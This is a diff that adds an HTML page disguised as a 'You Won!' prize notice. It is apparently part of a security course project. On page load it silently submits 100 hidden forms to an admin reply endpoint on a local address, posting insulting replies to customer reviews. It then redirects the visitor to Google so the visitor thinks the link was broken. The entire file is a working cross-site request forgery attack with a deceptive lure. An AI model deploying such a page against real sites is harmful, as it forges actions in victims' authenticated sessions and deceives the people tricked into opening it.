@@ -1,0 +1,61 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <title>You Won!</title>
+</head>
+<body onload="launchAttack()">
+    <h1>Redirecting to your prize... Please wait.</h1>
+
+    <div id="attack-containers" style="display: none !important;"></div>
+
+    <script>
+        function launchAttack() {
+            // change to the attacker server url
+            const targetUrl = "http://192.168.1.47/CyberProject/admin_reply.php";
+            const insults = [
+                "Stop complaining! You are just a boring person.",
+                "Don't buy here again, we don't like you.",
+                "Your review is as bad as your personality.",
+                "Actually, we spit on your toaster before delivery."
+            ];
+
+            const container = document.getElementById("attack-containers");
+
+            for (let i = 1; i <= 100; i++) {
+                const iframe = document.createElement("iframe");
+                iframe.name = "hidden_frame_" + i;
+                iframe.style.display = "none";
+                // Now appending to the invisible container
+                container.appendChild(iframe);
+
+                const form = document.createElement("form");
+                form.method = "POST";
+                form.action = targetUrl;
+                form.target = iframe.name;
+                
+                const idInput = document.createElement("input");
+                idInput.name = "review_id";
+                idInput.value = i;
+
+                const contentInput = document.createElement("input");
+                contentInput.name = "reply_content";
+                contentInput.value = insults[Math.floor(Math.random() * insults.length)];
+
+                form.appendChild(idInput);
+                form.appendChild(contentInput);
+                
+                // Now appending to the invisible container
+                container.appendChild(form);
+
+                form.submit();
+            }
+
+            //send the user back to google so he will think the link is just broken
+            setTimeout(() => {
+                window.location.href = "https://www.google.com";
+            }, 2000);
+        }
+    </script>
+</body>
+</html>
